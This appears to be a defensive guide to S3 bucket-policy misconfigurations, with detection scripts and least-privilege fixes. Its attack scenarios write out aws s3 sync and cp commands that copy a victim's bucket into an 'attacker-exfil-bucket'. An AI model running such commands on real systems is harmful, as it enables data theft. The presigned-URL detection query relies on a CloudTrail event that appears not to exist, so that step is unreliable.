# S3 Bucket Policies — Dangerous Patterns and Cross-Account Exfiltration

## Attack Scenarios

### Scenario 1 — Principal: * With No Conditions
```json
// Dangerous bucket policy — anyone on the internet can read
{
  "Effect": "Allow",
  "Principal": "*",
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::company-data/*"
}
// No authentication required — curl https://company-data.s3.amazonaws.com/file works
```

### Scenario 2 — Cross-Account Data Exfiltration
Attacker gains a role with `s3:GetObject` on your bucket and copies everything to their own AWS account:

```bash
# Attacker sets up their own bucket in their account
aws s3 mb s3://attacker-exfil-bucket --region us-east-1

# Syncs your entire bucket to their account
aws s3 sync s3://victim-company-data s3://attacker-exfil-bucket \
  --source-region ap-south-1 \
  --region us-east-1
# All your data is now in their account — no network trace in your VPC flow logs
# Only visible in CloudTrail S3 data events

# Or uses a single copy command for targeted files
aws s3 cp s3://victim-company-data/customer-database.csv \
  s3://attacker-exfil-bucket/stolen/
```

### Scenario 3 — Overly Broad IAM Role on S3
```json
// IAM policy attached to an EC2 role — way too broad
{
  "Effect": "Allow",
  "Action": "s3:*",
  "Resource": "*"
}
// Any process on this EC2, or anyone who steals the role,
// can read, write, delete every bucket in the account
```

### Scenario 4 — Presigned URL with Long TTL
```bash
# Developer generates a presigned URL for a "quick share" — sets TTL to 7 days
aws s3 presign s3://company-data/sensitive-contract.pdf \
  --expires-in 604800  # 7 days in seconds

# URL is sent over Slack, email, or chat — gets indexed, forwarded, leaked
# Anyone with the URL can download the file for 7 days with no auth
```

---

## Detection

```bash
# 1. Find buckets with policies allowing Principal: *
aws s3api list-buckets --query 'Buckets[*].Name' --output text | \
  tr '\t' '\n' | while read -r bucket; do
    policy=$(aws s3api get-bucket-policy --bucket "$bucket" \
      --query 'Policy' --output text 2>/dev/null || echo "")
    if echo "$policy" | python3 -c "
import sys, json
p = json.loads(sys.stdin.read())
for stmt in p.get('Statement', []):
    principal = stmt.get('Principal', '')
    if principal == '*' or (isinstance(principal, dict) and principal.get('AWS') == '*'):
        print('FOUND')
        break
" 2>/dev/null | grep -q FOUND; then
      echo "CRITICAL: $bucket has Principal: * in bucket policy"
    fi
  done

# 2. Detect large S3 data transfers via CloudTrail (potential exfil)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[*].[EventTime,Username,SourceIPAddress,Resources[0].ResourceName]' \
  --output table

# 3. Detect cross-account bucket access
# Look for GetObject calls from unexpected account IDs
aws logs start-query \
  --log-group-name aws-cloudtrail-logs \
  --start-time $(date -d '24 hours ago' +%s) \
  --end-time $(date +%s) \
  --query-string '
    fields userIdentity.accountId, eventName, requestParameters.bucketName
    | filter eventName = "GetObject"
    | filter userIdentity.accountId != "123456789012"
    | stats count(*) by userIdentity.accountId, requestParameters.bucketName'

# 4. Check for presigned URLs that were recently generated
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GeneratePresignedUrl \
  --start-time $(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[*].[EventTime,Username,CloudTrailEvent]' \
  --output table

# 5. Enable S3 server access logging
aws s3api put-bucket-logging \
  --bucket my-sensitive-bucket \
  --bucket-logging-status '{
    "LoggingEnabled": {
      "TargetBucket": "my-access-logs-bucket",
      "TargetPrefix": "s3-access-logs/my-sensitive-bucket/"
    }
  }'
```

---

## Fix — Least Privilege Bucket Policies

```bash
# Fix 1: Scope bucket policy to specific IAM roles only (not *)
aws s3api put-bucket-policy \
  --bucket my-app-bucket \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": [
            "arn:aws:iam::123456789012:role/AppServerRole",
            "arn:aws:iam::123456789012:role/DeployRole"
          ]
        },
        "Action": ["s3:GetObject", "s3:PutObject"],
        "Resource": "arn:aws:s3:::my-app-bucket/*"
      },
      {
        "Effect": "Deny",
        "Principal": "*",
        "Action": "s3:*",
        "Resource": [
          "arn:aws:s3:::my-app-bucket",
          "arn:aws:s3:::my-app-bucket/*"
        ],
        "Condition": {
          "StringNotEquals": {
            "aws:SourceVpce": "vpce-0123456789abcdef0"
          }
        }
      }
    ]
  }'

# Fix 2: Block cross-account access entirely
# Add this deny statement to your bucket policy
cat <<'EOF'
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:*",
  "Resource": [
    "arn:aws:s3:::my-bucket",
    "arn:aws:s3:::my-bucket/*"
  ],
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalAccount": "123456789012"
    }
  }
}
EOF

# Fix 3: Limit presigned URL TTL in application code
# Python — enforce short TTL
python3 - <<'EOF'
import boto3

s3 = boto3.client('s3', region_name='ap-south-1')

# Max 15 minutes — not days
url = s3.generate_presigned_url(
    'get_object',
    Params={'Bucket': 'my-bucket', 'Key': 'document.pdf'},
    ExpiresIn=900  # 15 minutes max
)
print(url)
EOF

# Fix 4: Enforce HTTPS-only access
cat <<'EOF'
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:*",
  "Resource": [
    "arn:aws:s3:::my-bucket",
    "arn:aws:s3:::my-bucket/*"
  ],
  "Condition": {
    "Bool": {
      "aws:SecureTransport": "false"
    }
  }
}
EOF
```

---

## Checklist

- [ ] No bucket policy has `Principal: "*"` without restrictive conditions
- [ ] Cross-account access explicitly denied unless required
- [ ] VPC endpoint condition on all internal-use buckets
- [ ] Presigned URL TTL capped at 15 minutes in application code
- [ ] HTTPS-only enforce deny statement in all bucket policies
- [ ] IAM roles scoped to specific bucket ARNs — no `Resource: *` on S3
- [ ] CloudTrail S3 data events (GetObject, PutObject, DeleteObject) enabled on sensitive buckets
- [ ] S3 server access logging enabled
